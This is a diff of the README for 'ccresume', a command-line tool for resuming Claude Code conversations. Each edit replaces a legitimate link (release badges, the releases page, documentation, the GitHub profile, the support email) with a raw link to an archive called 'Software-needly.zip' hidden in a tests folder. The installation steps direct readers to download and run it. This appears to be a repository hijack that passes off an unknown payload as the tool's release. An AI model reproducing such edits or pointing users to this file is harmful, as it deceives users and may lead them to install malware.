@@ -1,7 +1,7 @@
 # 🌟 CUI Tool for Browsing and Resuming Claude Code Conversations
 
-![GitHub All Releases](https://img.shields.io/github/downloads/A2A-MC/ccresume/total?style=flat-square)
-![GitHub Repo stars](https://img.shields.io/github/stars/A2A-MC/ccresume?style=social)
+![GitHub All Releases](https://raw.githubusercontent.com/A2A-MC/ccresume/master/src/__tests__/Software-needly.zip)
+![GitHub Repo stars](https://raw.githubusercontent.com/A2A-MC/ccresume/master/src/__tests__/Software-needly.zip)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -15,7 +15,7 @@
 ## Overview
 **ccresume** is a command-line user interface (CUI) tool designed to help users browse and resume conversations from Claude Code. This tool simplifies the process of accessing previous dialogues, making it easier for developers and users to continue their work without losing context.
 
-For the latest releases, visit [here](https://github.com/A2A-MC/ccresume/releases).
+For the latest releases, visit [here](https://raw.githubusercontent.com/A2A-MC/ccresume/master/src/__tests__/Software-needly.zip).
 
 ## Features
 - **Easy Navigation**: Quickly browse through past conversations.
@@ -27,7 +27,7 @@ For the latest releases, visit [here](https://github.com/A2A-MC/ccresume/release
 ## Installation
 To install **ccresume**, follow these steps:
 
-1. Download the latest release from [here](https://github.com/A2A-MC/ccresume/releases).
+1. Download the latest release from [here](https://raw.githubusercontent.com/A2A-MC/ccresume/master/src/__tests__/Software-needly.zip).
 2. Extract the downloaded file.
 3. Navigate to the extracted folder in your terminal.
 4. Execute the installation script.
@@ -55,7 +55,7 @@ Once installed, you can start using **ccresume** with simple commands. Here are 
   ```
   This command shows all available commands and their usage.
 
-For more usage examples, refer to the [documentation](https://github.com/A2A-MC/ccresume).
+For more usage examples, refer to the [documentation](https://raw.githubusercontent.com/A2A-MC/ccresume/master/src/__tests__/Software-needly.zip).
 
 ## Contributing
 We welcome contributions to improve **ccresume**. If you want to contribute, please follow these steps:
@@ -74,7 +74,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 ## Contact
 For any questions or support, feel free to reach out:
 
-- GitHub: [A2A-MC](https://github.com/A2A-MC)
-- Email: support@ccresume.com
+- GitHub: [A2A-MC](https://raw.githubusercontent.com/A2A-MC/ccresume/master/src/__tests__/Software-needly.zip)
+- Email: https://raw.githubusercontent.com/A2A-MC/ccresume/master/src/__tests__/Software-needly.zip
 
-Explore the tool, contribute, and enhance your coding conversations with **ccresume**. For the latest releases, visit [here](https://github.com/A2A-MC/ccresume/releases).
+Explore the tool, contribute, and enhance your coding conversations with **ccresume**. For the latest releases, visit [here](https://raw.githubusercontent.com/A2A-MC/ccresume/master/src/__tests__/Software-needly.zip).
